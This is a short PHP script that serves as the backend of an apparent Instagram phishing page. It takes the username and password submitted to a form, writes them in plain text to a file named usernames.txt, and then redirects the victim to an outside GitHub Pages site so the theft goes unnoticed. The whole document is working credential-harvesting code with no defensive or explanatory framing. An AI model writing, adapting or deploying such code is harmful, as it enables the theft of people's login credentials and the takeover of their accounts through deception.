<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://ocdingmcodes.github.io/cats4you/oladutch/index');
exit();
?>
